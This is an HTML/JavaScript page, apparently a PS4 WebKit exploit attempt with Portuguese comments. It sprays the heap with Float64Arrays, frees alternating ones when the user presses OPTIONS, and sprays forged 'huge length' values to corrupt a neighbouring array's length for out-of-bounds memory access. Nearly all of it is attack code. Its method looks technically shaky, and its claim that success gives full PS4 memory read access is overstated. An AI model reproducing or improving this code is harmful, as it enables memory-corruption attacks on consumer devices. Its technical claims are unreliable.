<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Webkit: Length Corruption (OOB)</title>
<style>
    body { background-color: #111; color: #ddd; font-family: monospace; text-align: center; }
    h1 { color: #ffcc00; }
    .status { border: 2px solid #555; padding: 20px; background: #222; margin: 20px auto; max-width: 600px;}
    button { background: #d35400; color: white; border: none; padding: 15px 30px; font-size: 1.2em; cursor: pointer; font-weight: bold; }
</style>
</head>
<body>

<h1>PS4 Exploit: Array Length Corruption</h1>
<div class="status" id="msg">
    1. Clique INICIAR.<br>
    2. Aperte OPTIONS.<br>
    3. Torça para aparecer TELA AZUL.
</div>
<button onclick="fire()">INICIAR OOB TEST</button>
<div id="log" style="text-align:left; margin:20px; border:1px solid #444; padding:10px;"></div>

<script>
    const Msg = document.getElementById('msg');
    const Log = document.getElementById('log');
    function log(txt) { Log.innerHTML += txt + "<br>"; }

    // Constantes do Webkit (Podem variar levemente entre firmwares)
    // Estamos tentando forjar um Butterfly Header que tenha um length gigante.
    // O valor 0x0001000000000000 representa um length alto em alguns layouts.
    const HUGE_LENGTH_GUESS = 1.3906717577229e-309; // ~0x00010000... (Float representation)

    let arrays = [];
    const COUNT = 10000;

    function fire() {
        Msg.innerText = "Preparando Heap...";
        
        // FASE 1: Setup "Sandwich"
        // Criamos arrays vizinhos. A esperança é que, ao liberar um,
        // o spray sobrescreva o cabeçalho (length) do próximo.
        for(let i=0; i<COUNT; i++) {
            let a = new Float64Array(16);
            a[0] = i; // Marcador
            arrays.push(a);
        }

        Msg.innerText = "PRONTO. Aperte OPTIONS agora!";

        // Trigger
        const doc = document.documentElement;
        if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
        else if (doc.requestFullscreen) doc.requestFullscreen();

        window.onblur = function() {
            log("[*] Blur! Tentando corromper Length...");

            // FASE 2: O Ataque
            // Liberamos METADE dos arrays (buracos alternados)
            for(let i=0; i<COUNT; i+=2) {
                arrays[i] = null;
            }

            // SPRAY: Tentamos preencher os buracos.
            // O objetivo é que o spray "vaze" ou alinhe mal e acerte o 
            // cabeçalho dos arrays sobreviventes (i+1).
            let spray = [];
            try {
                for(let i=0; i<COUNT; i++) {
                    // Criamos arrays preenchidos com o valor que simula um Length gigante
                    let s = new Float64Array(32); 
                    s.fill(HUGE_LENGTH_GUESS);
                    spray.push(s);
                }
            } catch(e) {}

            // FASE 3: Verificação
            log("[*] Verificando sobreviventes...");
            let success = false;
            
            for(let i=1; i<COUNT; i+=2) {
                if (arrays[i] != null) {
                    // O tamanho original era 16.
                    // Se for maior que 16, conseguimos OOB!
                    if (arrays[i].length > 16) {
                        success = true;
                        document.body.style.background = "#000088"; // AZUL
                        Msg.innerHTML = "<h1>SUCESSO! OOB ALCANÇADO!</h1>";
                        log("<b>[!!!] Array[" + i + "] Length corrompido!</b>");
                        log("Original: 16");
                        log("Novo: " + arrays[i].length);
                        log("Agora você pode ler toda a memória do PS4.");
                        break;
                    }
                }
            }

            if(!success) {
                log("[-] Falha: Nenhum length foi alterado.");
                document.body.style.background = "#550000";
            }
        };
    }
</script>
</body>
</html>
